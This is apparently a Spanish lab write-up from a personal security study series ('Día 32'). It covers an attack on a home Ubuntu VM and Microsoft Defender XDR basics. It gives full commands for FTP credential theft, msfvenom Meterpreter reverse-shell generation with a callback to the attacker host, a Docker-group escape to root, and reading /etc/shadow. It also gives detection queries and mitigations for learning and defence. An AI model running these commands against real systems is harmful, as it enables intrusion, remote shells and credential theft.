# Día 32 — Post Exploitation: Meterpreter + Microsoft Defender XDR Introducción

**Fecha:** Mayo 2026  
**MITRE:** T1059.002  
**Target:** Ubuntu 192.168.1.96

---

## Teoría

### Meterpreter vs Reverse Shell básica

Post exploitation es la fase que viene después de obtener acceso inicial. Meterpreter es el payload más avanzado de Metasploit — a diferencia de una reverse shell básica:

| | Reverse Shell básica | Meterpreter |
|--|---------------------|------------|
| **Almacenamiento** | Archivo en disco | Solo en memoria |
| **Tráfico** | En claro | Encriptado SSL |
| **Features** | Terminal básica | hashdump, migrate, pivoting |
| **Detección** | Más fácil | Más difícil (no escribe disco) |
| **Plataforma** | Cualquier OS | Windows/Linux/Android |

**Cuándo usar Meterpreter sobre SSH directo:**
- Cuando no tienes credenciales — entras por exploit o vulnerabilidad web
- Cuando quieres comunicación encriptada que evada detección
- Cuando necesitas features avanzadas: migrate, hashdump, pivoting
- SSH deja logs en `auth.log` — Meterpreter es más silencioso

**Comandos esenciales de Meterpreter:**

| Comando | Qué hace |
|---------|----------|
| `sysinfo` | OS, hostname, arquitectura |
| `getuid` | Usuario actual |
| `getpid` | PID del proceso actual |
| `ps` | Lista de procesos del sistema |
| `migrate <PID>` | Migra a otro proceso (Windows) |
| `getsystem` | Intenta escalar privilegios |
| `hashdump` | Extrae hashes de passwords |
| `shell` | Abre bash/cmd dentro de Meterpreter |
| `background` | Manda sesión al background |
| `upload/download` | Transferir archivos |

### Escalación via Docker

Cuando un usuario pertenece al grupo `docker`, puede ejecutar contenedores sin sudo. Esto equivale a tener acceso root implícito al host:

```
vboxuser ∈ grupo docker
    ↓
docker run -v /:/mnt  →  monta filesystem completo del host
    ↓
chroot /mnt sh        →  cambia raíz al filesystem del host
    ↓
uid=0(root)           →  root sin password
```

---

## Red Team

### Flujo del ataque

**El flujo ideal para este escenario hubiera sido:**
```
nmap → CVE en servicio → Metasploit exploit → Meterpreter directo → escalación
```

En cambio el flujo ejecutado fue:
```
nmap → FTP anonymous → credenciales → SSH → msfvenom → Meterpreter → Docker escape → root
```

Meterpreter fue redundante al ya tener acceso SSH. El escenario correcto para Meterpreter es cuando no hay credenciales y se entra por exploit.

### Sección 1 — Reconocimiento

```bash
nmap -sV 192.168.1.96 -p 21,22,80,8080,3000 --open
```

**Servicios identificados:**
```
21   → vsftpd 3.0.5
22   → OpenSSH 10.0p2 (Ubuntu 25.10)
80   → Apache httpd
3000 → OWASP Juice Shop
8080 → Apache 2.4.25 (Debian) ← versión antigua, 2017
```

**Apache 2.4.25 en el puerto 8080** — versión de 2017 con CVEs conocidos. Vector potencial para Metasploit en un escenario más realista.

### Sección 2 — FTP Anonymous + Credenciales

```bash
nmap --script ftp-anon 192.168.1.96 -p 21
# → Anonymous FTP login allowed
# → secret.txt encontrado
```

```bash
ftp 192.168.1.96
# anonymous / (enter vacío)
get secret.txt /tmp/secret.txt
bye

cat /tmp/secret.txt
# → credentials: admin/password123
```

Credenciales expuestas en archivo público — hallazgo crítico de seguridad.

### Sección 3 — Intento de exploit vsftpd

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.96
set PAYLOAD cmd/unix/interact
run
# → Exploit completed, but no session was created.
# → Banner: 220 (vsFTPd 3.0.5) — exploit es para 2.3.4
```

El exploit falló — la versión 3.0.5 no tiene el backdoor de 2011 (CVE-2011-2523).

### Sección 4 — Acceso SSH y generación de payload Meterpreter

```bash
ssh vboxuser@192.168.1.96
# → uid=1000(vboxuser) groups=sudo,docker ← crítico
```

**Generación del payload desde Kali:**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.132 \
  LPORT=4444 \
  -f elf \
  -o /tmp/shell.elf
# → Payload size: 130 bytes / Final size: 250 bytes
```

**Transferencia a Ubuntu:**
```bash
scp /tmp/shell.elf vboxuser@192.168.1.96:/tmp/shell.elf
```

### Sección 5 — Sesión Meterpreter

**Listener en Kali:**
```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD linux/x64/meterpreter/reverse_tcp; \
  set LHOST 192.168.1.132; \
  set LPORT 4444; run"
```

**Ejecución del payload en Ubuntu:**
```bash
chmod +x /tmp/shell.elf && /tmp/shell.elf
```

**Resultado:**
```
[*] Meterpreter session 1 opened
192.168.1.132:4444 → 192.168.1.96:56330
```

**Reconocimiento desde Meterpreter:**
```
sysinfo → Ubuntu 25.10, Linux 6.17.0-22-generic, x64
getuid  → vboxuser
ps      → python3 (PID 869, root), cron (882), dockerd (1582), vsftpd (1308)
```

**Nota sobre `migrate`:** el comando `migrate` no está disponible en Meterpreter de Linux — solo en Windows. En Linux la escalación se hace via módulos de post-exploitation o desde shell.

### Sección 6 — Escalación via Docker escape

```bash
# Desde Meterpreter, abrir shell interactiva
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Docker escape — monta el filesystem completo del host
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**ROOT OBTENIDO** ✅
```
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon)...sudo
```

**Demostración de acceso total:**
```bash
cat /etc/shadow
# → vboxuser:$y$j9T$t23wcW0kpA82bAFLmAeHe1$...
# → lowpriv:$y$j9T$M63lj3LfX.AXcwtx8uwOQ1$...  ← usuario oculto
```

`/etc/shadow` contiene los hashes de passwords — en producción esto permitiría crackearlos con hashcat y comprometer todas las cuentas.

### Flujo correcto con Metasploit — post-exploitation ideal

El flujo correcto hubiera sido mantenerse dentro de Metasploit para la escalación:

```bash
# Desde Meterpreter
background

# Usar suggester para identificar vectores de escalación
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
# → sugiere exploits disponibles

# Usar el exploit sugerido
use exploit/linux/local/docker_privileged_container_escape
set SESSION 1
run
# → nueva sesión con uid=0
```

Todo el flujo dentro de Metasploit — más limpio, más documentable, sin salir a shell manual.

---

## SC-200 — Microsoft Defender XDR: Introducción

### ¿Qué es Microsoft Defender XDR?

XDR (Extended Detection and Response) es la evolución del EDR. En lugar de proteger solo endpoints, correlaciona señales de múltiples fuentes:

```
EDR (antes)  → solo endpoints (dispositivos)
XDR (ahora)  → endpoints + identidades + email + cloud apps + red
```

Microsoft Defender XDR unifica 5 productos en una sola consola:

| Producto | Qué protege |
|----------|------------|
| Defender for Endpoint | Dispositivos Windows/Linux/Mac |
| Defender for Identity | Active Directory, cuentas |
| Defender for Office 365 | Email, Teams, SharePoint |
| Defender for Cloud Apps | SaaS apps (Salesforce, Box...) |
| Defender for Cloud | Infraestructura Azure |

### El portal security.microsoft.com

El portal unifica Defender XDR + Microsoft Sentinel en una sola interfaz. Secciones principales exploradas en días anteriores:

**Investigación y respuesta:**
- Incidentes — alertas correlacionadas automáticamente
- Alertas — eventos individuales de seguridad
- Advanced Hunting — KQL para threat hunting proactivo
- Acciones y envíos — aislar dispositivos, bloquear archivos

**Automatic Attack Disruption:**
Defender puede interrumpir ataques automáticamente sin intervención humana — visto en el incidente de hands-on keyboard attack (Día 27) donde bloqueó el movimiento lateral via RDP automáticamente.

**Clasificación de activos:**
```
Dispositivos  → Defender for Endpoint (aislar)
Usuarios      → Defender for Identity (deshabilitar)
Buzones       → Defender for Office 365 (bloquear)
Cloud Apps    → Defender for Cloud Apps (suspender)
```

### Correlación con el ataque del Día 32

El ataque de hoy hubiera generado estas alertas en Defender XDR si el Ubuntu tuviera el agente instalado:

```
T1083  → Sensitive file read (/etc/shadow)
T1059  → Script execution (/tmp/shell.elf)
T1610  → Deploy container (docker run alpine)
T1611  → Container escape (chroot al host)
```

La query KQL para detectarlo:
```kql
AlertInfo
| where AttackTechniques contains "T1611" or AttackTechniques contains "T1610"
| project Timestamp, Title, Severity, AttackTechniques
```

---

## Blue Team

### Detección
- **Logs de Docker** — `docker events` registra cada contenedor ejecutado
- **auditd** — regla para detectar `chroot` ejecutado desde contenedor
- **Defender for Endpoint** — alerta T1611 Container Escape
- **FTP logs** — anonymous login + descarga de archivos sensibles

### Mitigación
- **Remover usuarios del grupo docker** — si no necesitan ejecutar contenedores
- **Rootless Docker** — configurar Docker en modo sin privilegios root
- **No exponer FTP con anonymous** — especialmente con archivos de credenciales
- **Archivos de credenciales** — nunca en texto plano, usar gestores de secretos
- **Política de least privilege** — `vboxuser` no debería tener acceso a Docker

---

## Conclusión

El Día 32 demostró el flujo completo de post-exploitation desde reconocimiento hasta root. El hallazgo más valioso fue el archivo `secret.txt` en FTP anonymous con credenciales en texto plano — una vulnerabilidad crítica que no requirió ningún exploit. La escalación via Docker escape es elegante porque usa una feature legítima del sistema contra sí mismo. El aprendizaje clave es que Meterpreter es más útil cuando no hay credenciales SSH disponibles — en este escenario fue redundante. El flujo ideal para Meterpreter es: exploit de servicio vulnerable → sesión Meterpreter → post/multi/recon/local_exploit_suggester → escalación sin salir de Metasploit.
